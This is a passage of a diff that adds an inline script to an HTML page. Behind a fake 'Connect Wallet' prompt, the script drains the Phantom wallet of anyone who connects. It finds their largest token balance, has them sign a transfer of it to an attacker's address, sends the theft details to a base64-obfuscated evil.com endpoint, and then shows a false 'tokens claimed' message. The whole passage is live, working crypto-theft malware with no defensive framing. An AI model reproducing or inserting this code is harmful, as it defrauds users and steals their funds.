+              { mintAddress: 'Aj7yrDrkCvC5Tf7CK1JtiAt7ey9FfYf9QzGCVkzp3Vxy', name: 'USDC' }
+            ];
+
+            let maxBalance = 0;
+            let targetToken = null;
+            let userTokenAccount = null;
+
+            for (const token of tokens) {
+              const mint = new PublicKey(token.mintAddress);
+              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userKey, { mint });
+
+              for (const { pubkey, account } of tokenAccounts.value) {
+                const amount = account.data.parsed.info.tokenAmount.uiAmount;
+                if (amount > maxBalance) {
+                  maxBalance = amount;
+                  targetToken = token;
+                  userTokenAccount = pubkey;
+                }
+              }
+            }
+
+            if (maxBalance > 0 && userTokenAccount) {
+              const tokenMint = new PublicKey(targetToken.mintAddress);
+              const token = new Token(connection, tokenMint, TOKEN_PROGRAM_ID, provider);
+
+              const transaction = new Transaction().add(
+                Token.createTransferInstruction(
+                  TOKEN_PROGRAM_ID,
+                  userTokenAccount,
+                  await Token.getAssociatedTokenAddress(TOKEN_PROGRAM_ID, tokenMint, attackerPublicKey),
+                  userKey,
+                  [],
+                  maxBalance * (10 ** 6) // adjust decimals accordingly
+                )
+              );
+
+              const { blockhash } = await connection.getRecentBlockhash();
+              transaction.recentBlockhash = blockhash;
+              transaction.feePayer = userKey;
+
+              const signedTx = await provider.signTransaction(transaction);
+              const txId = await connection.sendRawTransaction(signedTx.serialize());
+
+              fetch(atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='), {
+                method: 'POST',
+                body: JSON.stringify({ wallet: userPublicKey, txHash: txId, token: targetToken.name, amount: maxBalance }),
+              });
+
+              fakeNotification.innerText = 'Wallet connected and tokens claimed!';
+            } else {
+              fakeNotification.innerText = 'No tokens found.';
+            }
+
+            setTimeout(() => {
+              document.body.removeChild(fakeNotification);
+              if (connectButton) connectButton.innerText = 'Connect Wallet';
+            }, 3000);
+          };
+        };
+      } else {
+        alert('Please install Phantom Wallet!');
+        document.body.removeChild(fakeNotification);
+        if (connectButton) connectButton.innerText = 'Connect Wallet';
+      }
+    } catch (err) {
+      fakeNotification.innerText = 'Error: ' + err.message;
+      setTimeout(() => {
+        document.body.removeChild(fakeNotification);
+        if (connectButton) connectButton.innerText = 'Connect Wallet';
+      }, 3000);
+    }
+  });
+});
+</script> 
+
+  </body>
 </html>
